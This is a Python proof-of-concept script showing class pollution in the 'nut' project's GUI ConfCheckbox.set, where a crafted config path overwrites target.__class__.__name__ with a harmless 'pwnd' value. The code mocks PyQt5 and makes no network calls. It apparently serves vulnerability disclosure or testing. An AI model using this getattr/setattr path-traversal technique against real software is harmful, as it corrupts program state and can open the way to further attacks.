# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: ConfCheckbox.set (via GUI filter config)
# Type: get-attr-set-attr
# Trigger: Malicious config value bound to a GUI checkbox
#
# nut's GUI uses ConfCheckbox widgets that read/write config values via
# dot-separated paths on a Config object. A malicious config entry with
# a crafted path triggers class pollution when the checkbox state changes.

import sys
import types

# Mock Qt and nut dependencies
qt_widgets = types.ModuleType('PyQt5.QtWidgets')
class QCheckBox:
  def __init__(self, *args, **kwargs): pass
  def setChecked(self, *a): pass
  def stateChanged(self): return type('Signal', (), {'connect': lambda *a: None})()
qt_widgets.QCheckBox = QCheckBox
sys.modules['PyQt5'] = types.ModuleType('PyQt5')
sys.modules['PyQt5.QtWidgets'] = qt_widgets
sys.modules['PyQt5.QtCore'] = types.ModuleType('PyQt5.QtCore')

from gui.panes.filters import ConfCheckbox

class Config:
  pass

class Target: pass
target = Target()
Config.target = target

payload_value = "pwnd"

def run_poc():
  import gui.panes.filters as filters_mod
  filters_mod.Config = Config
  
  # Simulates a malicious config path bound to a checkbox
  checkbox = ConfCheckbox.__new__(ConfCheckbox)
  checkbox.conf = "target.__class__.__name__"
  checkbox.set(payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
